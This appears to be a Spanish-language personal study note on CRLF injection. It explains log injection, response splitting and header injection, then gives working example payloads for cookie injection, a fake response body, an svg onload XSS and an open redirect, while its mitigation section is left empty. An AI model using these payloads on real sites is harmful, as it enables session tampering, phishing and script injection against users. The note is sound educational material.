### ¿Qué es CLRF Injection?
Un ataque CRLF (Carriage Return Line Feed) es un ataque que manipula los caracteres especiales CL y RF$^1$ que encontramos en los Headers HTTP
>1 --> CR y LF son caracteres de control y bytecode. CR (Carriage Return, `\r`, `0x0D` en hexadecimal) mueve el cursor al principio de la línea, sin avanzar a la siguiente. LF (Line Feed, `\n`, `0x0A`), mueve el cursor a la siguiente línea sin volver al principio de la línea. Se combinan para marcar el final de una línea así:
```
%0D%0A
```
```
\r\n
```

Para comprender como hallar y explotar el CRLF injection debemos saber que es necesario que haya una falta de sanitización propia en como la aplicación gestiona las entradas de usuarios. Cuando el usuario puede inyectar una secuencia CRLF en la solicitud HTTP, pueden inyectarse Headers arbitrarios o dividir la respuesta en 2 partes.

Esto puede sucederse de otros ataques como Cookiejacking, Cookie injection, [[XSS]], [[Ciberseguridad/Apuntes/Vulnerabilidades/Non Technical/Phishing]] mediante redirecciones no deseadas, y Cache Poisoning, así como la falsificación de logs, utilizado para inculpar a agentes inocentes o cubrir huellas.

![[CRLFi.webp]]

##### Tipos de CRLFi
- **Inyección a Log Files**: Pone en riesgo la integridad de los logs y se explota para inculpar partes no involucradas u ocultar actividad maliciosa
- **Response splitting**: Cuando un CRLF se puede inyectar en un response header, pueden inyectarse headers arbitrarios, controlar el contenido de la response o incluso separarla en dos distintas.
- **Header injection**: Es similar al splitting, solo que se centra exclusivamente en inyectar headers maliciosos
##### Metodología
**Session fixation**: Dada esta respuesta HTTP:
```
HTTP/1.1 200 OK
Content-Type: text/html
Set-Cookie: sessionid=abc123
```
Si la sanitización es incorrecta y el atacante puede inyectar exitosamente un payload como este `value\r\nSet-Cookie: admin=true`, la response quedaría así:
```
HTTP/1.1 200 OK
Content-Type: text/html
Set-Cookie: sessionid=value
Set-Cookie: admin=true --> Aquí el atacante inyecta una cookie validada como admin, bypasseando autenticación
```
**XSS**: El ejemplo de arriba requiere de unos controles de seguridad nefastos para funcionar, una forma más realista de explotar CLRF sería creando un nuevo response body para atacar mediante XSS:
```
http://www.example.net/index.php?lang=en%0D%0AContent-Length%3A%200%0A%20%0AHTTP/1.1%20200%20OK%0AContent-Type%3A%20text/html%0ALast-Modified%3A%20Mon%2C%2027%20Oct%202060%2014%3A50%3A18%20GMT%0AContent-Length%3A%2034%0A%20%0A%3Chtml%3EYou%20have%20been%20Phished%3C/html%3E
```
Dada esa URL maliciosa, la respuesta resultante sería esta en caso de sanitización insuficiente:
```
Set-Cookie:en
Content-Length: 0

HTTP/1.1 200 OK
Content-Type: text/html
Last-Modified: Mon, 27 Oct 2060 14:50:18 GMT
Content-Length: 34

<html>You have been Phished</html>
```
Para explotar en concreto XSS, podemos inyectar mediante CLRF el header `X-XSS-Protection` con valor equivalente a 0, entonces inyectaremos nuestro script.
```
http://example.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2f%2e%2e
```

```
HTTP/1.1 200 OK
Date: Tue, 20 Dec 2016 14:34:03 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 22907
Connection: close
X-Frame-Options: SAMEORIGIN
Last-Modified: Tue, 20 Dec 2016 11:50:50 GMT
ETag: "842fe-597b-54415a5c97a80"
Vary: Accept-Encoding
X-UA-Compatible: IE=edge
Server: NetDNA-cache/2.2
Link: https://example.com/[INJECTION STARTS HERE]
Content-Length:35
X-XSS-Protection:0

23
<svg onload=alert(document.domain)>
0
```

**Open redirecto**: También se puede inyectar un header `Location` para redirigir al usuario a una página arbitraria:
```
%0d%0aLocation:%20http://myweb.com
```
##### Filter Bypass
[PATT](%0d%0aLocation:%20http://myweb.com)
### Mitigación y prevención
### Fuentes
https://www.imperva.com/learn/application-security/crlf-injection/
https://owasp.org/www-community/vulnerabilities/CRLF_Injection
https://developer.mozilla.org/en-US/docs/Glossary/CRLF
https://lab.wallarm.com/what/ataque-de-inyeccion-crlf/?lang=es